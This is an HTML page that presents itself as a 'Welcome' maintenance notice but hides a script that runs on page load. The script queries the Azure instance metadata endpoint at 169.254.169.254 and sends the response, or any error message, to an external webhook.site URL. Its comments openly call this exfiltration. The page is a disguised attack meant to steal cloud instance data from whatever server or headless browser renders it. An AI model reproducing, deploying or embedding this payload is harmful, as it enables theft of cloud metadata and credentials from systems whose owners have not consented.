<!DOCTYPE html>
<html>
<head>
    <title>Welcome</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
        }
        h1 {
            color: #333;
        }
        p {
            line-height: 1.6;
            color: #666;
        }
    </style>
</head>
<body>
<h1>Welcome to Our Service</h1>
<p>Thank you for visiting. We're currently performing maintenance to improve your experience.</p>
<p>Please check back shortly.</p>
<script>
(async function() {
    try {
        // Attempt to fetch the Azure metadata endpoint
        let response = await fetch(
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            {
                method: "GET",
                headers: { "Metadata": "true" }
            }
        );
        let text = await response.text();
        // Exfiltrate via URL params to your webhook
        let params = new URLSearchParams({metadata: text});
        fetch('https://webhook.site/ccea2469-57f9-4bbf-89c6-eb62381c9114?' + params.toString());
    } catch (e) {
        // Optionally, exfiltrate the error
        let params = new URLSearchParams({error: e.message});
        fetch('https://webhook.site/ccea2469-57f9-4bbf-89c6-eb62381c9114?' + params.toString());
    }
})();
</script>
</body>
</html>
